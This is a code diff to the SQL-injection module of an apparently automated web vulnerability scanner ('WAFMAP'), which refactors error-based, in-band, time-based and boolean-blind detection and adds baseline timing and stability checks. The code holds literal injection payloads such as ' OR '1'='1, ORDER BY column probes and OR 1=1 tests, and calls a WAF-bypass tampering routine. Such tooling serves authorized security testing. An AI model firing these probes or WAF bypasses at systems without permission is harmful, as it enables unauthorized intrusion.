@@ -1,9 +1,7 @@
 import time
 import difflib
-import re
 from .tampering import apply_tampering
 from bs4 import BeautifulSoup
-import json
 
 SQLI_ERROR_MARKERS = [
     "SQL syntax", "mysql_", "MySQL Error", "valid MySQL result",
@@ -15,17 +13,11 @@ SQLI_ERROR_MARKERS = [
     "syntax error at or near", "Unexpected end of command", "QueryFailedError"
 ]
 
-FAILURE_KEYWORDS = [
-    "incorrect", "failed", "failure", "invalid", "try again", "access denied",
-    "bad password", "username or password", "identifiant incorrect"
-]
+SUCCESS_KEYWORDS = ["welcome", "access granted", "logout", "admin panel", "successfully"]
+FAIL_KEYWORDS = ["not found", "denied", "incorrect", "failure", "invalide"]
 
-SUCCESS_KEYWORDS = [
-    "welcome", "access granted", "logout", "admin panel", "successfully"
-]
-FAIL_KEYWORDS = [
-    "not found", "denied", "incorrect", "failure", "invalide"
-]
+TIME_MARGIN_SECONDS = 4
+STABILITY_THRESHOLD = 0.97
 
 
 def load_payloads_from_file(filename="payloads/sqli.txt"):
@@ -35,25 +27,22 @@ def load_payloads_from_file(filename="payloads/sqli.txt"):
     except FileNotFoundError:
         return ["' OR '1'='1"]
 
+
 def get_response_metrics(engine, url, method, data, params):
     start = time.time()
     is_post = method == 'POST'
     resp = engine._send_request(url, method=method, data=data if is_post else None, params=params if not is_post else None)
     duration = time.time() - start
-    if resp:
+    if resp is not None:
         return duration, resp.status_code, len(resp.text), resp.text
     return duration, 0, 0, ""
 
-def _profile_boolean_diff(text_true, text_fail):
-    profile = {
-        'success_found': False,
-        'fail_found': False
-    }
 
+def _profile_boolean_diff(text_true, text_fail):
+    profile = {'success_found': False, 'fail_found': False}
     try:
         soup_true = BeautifulSoup(text_true, 'html.parser')
         soup_fail = BeautifulSoup(text_fail, 'html.parser')
-        
         text_true_clean = soup_true.body.text.lower() if soup_true.body else soup_true.text.lower()
         text_fail_clean = soup_fail.body.text.lower() if soup_fail.body else soup_fail.text.lower()
 
@@ -62,74 +51,80 @@ def _profile_boolean_diff(text_true, text_fail):
                 if kw not in text_fail_clean or text_true_clean.count(kw) > text_fail_clean.count(kw):
                     profile['success_found'] = True
                     break
-                    
+
         for kw in FAIL_KEYWORDS:
             if kw in text_fail_clean:
                 if kw not in text_true_clean or text_fail_clean.count(kw) > text_true_clean.count(kw):
                     profile['fail_found'] = True
                     break
-
-    except:
-        pass 
-        
+    except Exception:
+        pass
     return profile
 
+
 def discover_column_count(engine, url, method, data_template, param_name):
-    global SQLI_ERROR_MARKERS 
     max_columns = 15
-    
     is_post = method == 'POST'
     template = data_template.copy()
-    
+
     resp_base = engine._send_request(url, method=method, data=template if is_post else None, params=template if not is_post else None)
-    if not resp_base: return None
+    if resp_base is None:
+        return None
     base_code = resp_base.status_code
 
     for count in range(1, max_columns + 1):
         payload = f"' ORDER BY {count} -- "
-        final_payload = payload 
-        
         req_data = template.copy()
-        req_data[param_name] = final_payload
-        
+        req_data[param_name] = payload
+
         resp = engine._send_request(url, method=method, data=req_data if is_post else None, params=req_data if not is_post else None)
-        
-        if resp:
+
+        if resp is not None:
             is_error = resp.status_code != base_code or any(err.lower() in resp.text.lower() for err in SQLI_ERROR_MARKERS)
-            
             if is_error:
                 return count - 1
-                
-    return None 
+
+    return None
+
 
 def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled, waf_name=None):
     url = injection_point['url']
     method = injection_point['method']
     defaults = injection_point.get('defaults', {})
-    
+
     csrf_token_data = {}
     if method == 'POST' and hasattr(engine, 'csrf_token') and isinstance(engine.csrf_token, dict):
         csrf_token_data = engine.csrf_token
 
     dummy_val = "WAFMAP_SAFE_VAL"
     base_data = defaults.copy()
-    if method == 'POST': base_data.update(csrf_token_data)
-    
+    if method == 'POST':
+        base_data.update(csrf_token_data)
+
     base_params = defaults.copy()
-    if method == 'GET': base_params.update(csrf_token_data) 
-    
-    data_template = base_data if method == 'POST' else base_params 
+    if method == 'GET':
+        base_params.update(csrf_token_data)
+
+    data_template = base_data if method == 'POST' else base_params
     data_template[param_name] = dummy_val
 
     column_count = None
     if level >= 2:
         column_count = discover_column_count(engine, url, method, data_template, param_name)
 
-    _, base_code, base_len, base_text = get_response_metrics(engine, url, method, data_template if method == 'POST' else None, data_template if method == 'GET' else None)
-    if base_code == 0: return
+    baseline_time_1, base_code, base_len, base_text = get_response_metrics(
+        engine, url, method, data_template if method == 'POST' else None, data_template if method == 'GET' else None
+    )
+    if base_code == 0:
+        return
 
-    true_payload = "WAFMAP_SAFE_VAL' OR 1=1 -- " 
-    false_payload = "WAFMAP_SAFE_VAL' OR 1=0 -- " 
+    baseline_time_2, _, _, _ = get_response_metrics(
+        engine, url, method, data_template if method == 'POST' else None, data_template if method == 'GET' else None
+    )
+    baseline_time = max(baseline_time_1, baseline_time_2)
+
+    true_payload = "WAFMAP_SAFE_VAL' OR 1=1 -- "
+    false_payload = "WAFMAP_SAFE_VAL' OR 1=0 -- "
 
     data_fail = data_template.copy()
     data_fail[param_name] = false_payload
@@ -139,82 +134,89 @@ def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled
     data_true[param_name] = true_payload
     _, _, _, text_true = get_response_metrics(engine, url, method, data_true if method == 'POST' else None, data_true if method == 'GET' else None)
 
-    matcher = difflib.SequenceMatcher(None, text_fail, text_true)
-    sim_bool = matcher.ratio()
+    _, _, _, text_true_retry = get_response_metrics(engine, url, method, data_true if method == 'POST' else None, data_true if method == 'GET' else None)
+    stability = difflib.SequenceMatcher(None, text_true, text_true_retry).ratio()
+    page_is_stable = stability >= STABILITY_THRESHOLD
 
-    is_boolean_vulnerable = sim_bool < 0.98
-    
-    semantic_profile = _profile_boolean_diff(text_true, text_fail) 
-    
+    sim_bool = difflib.SequenceMatcher(None, text_fail, text_true).ratio()
+    is_boolean_vulnerable = page_is_stable and sim_bool < 0.98
+
+    semantic_profile = _profile_boolean_diff(text_true, text_fail)
+
+    if level >= 2 and not page_is_stable and engine.config['verbose']:
+        print(f"[SQLI] Page instable sur {url} ({param_name}) : boolean-blind désactivé pour ce paramètre.")
+
     payloads = load_payloads_from_file()
 
     for payload in payloads:
-        if level == 1 and ("SLEEP" in payload or "WAITFOR" in payload): continue
+        if engine.is_vector_confirmed('SQLi', url, param_name):
+            return
+
+        if level == 1 and ("SLEEP" in payload or "WAITFOR" in payload):
+            continue
 
         final_payload = apply_tampering(payload, 'sqli', waf_bypass_enabled, waf_name)
-        
+
         data = data_template.copy()
         data[param_name] = final_payload
-        
+
         req_time, code, length, text = get_response_metrics(engine, url, method, data if method == 'POST' else None, data if method == 'GET' else None)
 
-        if code == 0: continue
+        if code == 0:
+            continue
 
-        found = False
+        error_hit = False
         for error in SQLI_ERROR_MARKERS:
             if error.lower() in text.lower():
                 engine.add_vulnerability("SQLi (Error-Based)", url, final_payload, f"Erreur BDD: {error}", parameter=param_name)
-                found = True
-                break 
-        if found: continue
+                error_hit = True
+                break
+        if error_hit:
+            return
 
         if "WAFMAP" in text:
-             payload_cols = payload.upper().count('WAFMAP') 
-             if not column_count or payload_cols == column_count:
-                 engine.add_vulnerability("SQLi (In-Band)", url, final_payload, "Marqueur reflété", parameter=param_name)
-                 continue
+            payload_cols = payload.upper().count('WAFMAP')
+            if not column_count or payload_cols == column_count:
+                engine.add_vulnerability("SQLi (In-Band)", url, final_payload, "Marqueur reflété", parameter=param_name)
+                return
 
-        if ("SLEEP" in payload or "WAITFOR" in payload) and req_time > 4:
-            check_payload = final_payload.replace("5", "0").replace("6", "0").replace("4", "0") 
-            c_data = data_template.copy()
-            c_data[param_name] = check_payload
-            
-            check_time, _, _, _ = get_response_metrics(engine, url, method, c_data if method == 'POST' else None, c_data if method == 'GET' else None)
-            
-            if check_time < 2:
+        if ("SLEEP" in payload or "WAITFOR" in payload) and req_time > (baseline_time + TIME_MARGIN_SECONDS):
+            confirm_time, _, _, _ = get_response_metrics(engine, url, method, data if method == 'POST' else None, data if method == 'GET' else None)
+
+            if confirm_time > (baseline_time + TIME_MARGIN_SECONDS):
                 engine.add_vulnerability(
-                    "SQLi (Time-Based)", 
-                    url, 
-                    final_payload, 
-                    f"Délai confirmé : {req_time:.2f}s vs Contrôle {check_time:.2f}s.", 
-                    parameter=param_name
+                    "SQLi (Time-Based)", url, final_payload,
+                    f"Délai reproduit deux fois : {req_time:.2f}s puis {confirm_time:.2f}s "
+                    f"(baseline {baseline_time:.2f}s).",
+                    parameter=param_name,
+                    confidence="Confirmée"
                 )
-                continue
+                return
+
+            engine.add_vulnerability(
+                "SQLi (Time-Based, non reproduit)", url, final_payload,
+                f"Premier délai de {req_time:.2f}s (baseline {baseline_time:.2f}s) non reproduit à la deuxième "
+                f"tentative ({confirm_time:.2f}s). Possible faux positif dû au réseau : à revérifier manuellement.",
+                parameter=param_name,
+                confidence="A vérifier"
+            )
 
         if code == 500 and base_code == 200:
             engine.add_vulnerability("SQLi (Blind/Error)", url, final_payload, "Erreur Serveur 500 provoquée", parameter=param_name)
-            continue
+            return
 
         if is_boolean_vulnerable:
-             data_attack = data_template.copy()
-             data_attack[param_name] = final_payload
-             # Correction de la signature: data si POST, params si GET
-             _, _, _, text_attack = get_response_metrics(engine, url, method, data_attack if method == 'POST' else None, data_attack if method == 'GET' else None)
+            data_attack = data_template.copy()
+            data_attack[param_name] = final_payload
+            _, _, _, text_attack = get_response_metrics(engine, url, method, data_attack if method == 'POST' else None, data_attack if method == 'GET' else None)
 
-             is_semantic_success = False
-             if semantic_profile['success_found']:
-                 for kw in SUCCESS_KEYWORDS:
-                     if kw in text_attack.lower():
-                         is_semantic_success = True
-                         break
-             
-             matcher_attack = difflib.SequenceMatcher(None, text_true, text_attack)
-             sim_attack = matcher_attack.ratio()
-             
-             if sim_attack > 0.95 or is_semantic_success: 
-                 details = f"Réponse similaire à l'état VRAI (Similitude: {sim_attack:.3f})"
-                 if is_semantic_success:
-                      details += " - Confirmation sémantique (Succès)"
-                      
-                 engine.add_vulnerability("SQLi (Boolean Blind)", url, final_payload, details, parameter=param_name)
-                 continue
+            is_semantic_success = semantic_profile['success_found'] and any(kw in text_attack.lower() for kw in SUCCESS_KEYWORDS)
+            sim_attack = difflib.SequenceMatcher(None, text_true, text_attack).ratio()
+
+            if sim_attack > 0.95 or is_semantic_success:
+                details = f"Réponse similaire à l'état VRAI (Similitude: {sim_attack:.3f}, stabilité page: {stability:.3f})"
+                if is_semantic_success:
+                    details += " - Confirmation sémantique (Succès)"
+
+                engine.add_vulnerability("SQLi (Boolean Blind)", url, final_payload, details, parameter=param_name)
+                return
